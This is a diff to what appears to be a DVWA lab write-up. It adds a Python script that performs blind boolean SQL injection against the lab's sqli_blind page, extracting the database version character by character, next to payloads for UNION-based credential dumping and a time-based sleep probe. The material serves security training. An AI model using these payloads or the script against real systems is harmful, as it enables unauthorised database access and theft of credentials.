@@ -638,6 +638,38 @@ Payload: `' UNION SELECT user, password FROM users#`
 
 Payload to detect vulnerability: `1' and sleep(5)#` it is taking 5 to response.
 
+Python code to brute force version:
+
+<details><summary markdown="span">Click to see code :diamond_shape_with_a_dot_inside: </summary>
+  
+```Python
+import requests
+from requests.structures import CaseInsensitiveDict
+
+headers = CaseInsensitiveDict()
+headers["Cookie"] = "security=low; PHPSESSID=to84ds41bhba7ub48s10a8qim0"
+url = 'http://192.168.170.131/vulnerabilities/sqli_blind/'
+
+for i in range(100):
+    parameters = f"id=1'+and+length(version())%3d{i}%23&Submit=Submit"
+    r = requests.get(url, headers=headers, params=parameters)
+    if 'User ID exists in the database' in r.text:
+        print(f'length = {i}')
+        length = i
+        break
+j = 1
+for i in range(1, length+1):
+    for s in range(30, 126):
+        parameters = f"id=1'+and+ascii(substring(version(),{i},{j}))%3d{s}%23&Submit=Submit"
+        r = requests.get(url, headers=headers, params=parameters)
+        if 'User ID exists in the database' in r.text:
+            print(chr(s), end='')
+            break
+        j += 1
+
+```
+
+</details>
 
 
 
